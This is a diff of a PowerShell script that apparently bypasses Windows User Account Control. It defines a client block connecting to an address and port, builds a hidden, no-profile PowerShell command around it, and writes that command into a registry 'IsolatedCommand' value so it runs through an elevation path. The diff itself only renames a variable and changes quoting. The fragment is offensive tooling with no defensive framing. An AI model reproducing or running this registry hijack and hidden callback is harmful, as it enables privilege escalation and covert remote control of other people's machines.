@@ -1,4 +1,4 @@
-$client ={  
+$client1 = {  
  
     $address = 'localhost'
     $port = 8000
@@ -49,9 +49,9 @@ $client ={
         }
  
 }
- 
- 
-$Command = "powershell -nop -window 1 $client "
+
+ $Command = powershell.exe -nop -window 1  $client1
+
  
 $Force = $True
  
@@ -69,7 +69,7 @@ $Force = $True
  
         if ($Force -or ((Get-ItemProperty -Path $exeCommandPath -Name 'IsolatedCommand' -ErrorAction SilentlyContinue) -eq $null)){
             New-Item $exeCommandPath -Force |
-                New-ItemProperty -Name 'IsolatedCommand' -Value $Command -PropertyType string -Force | Out-Null
+                New-ItemProperty -Name 'IsolatedCommand' -Value  $Command -PropertyType string -Force | Out-Null
         }else{
             Write-Warning "Key already exists, consider using -Force"
             exit
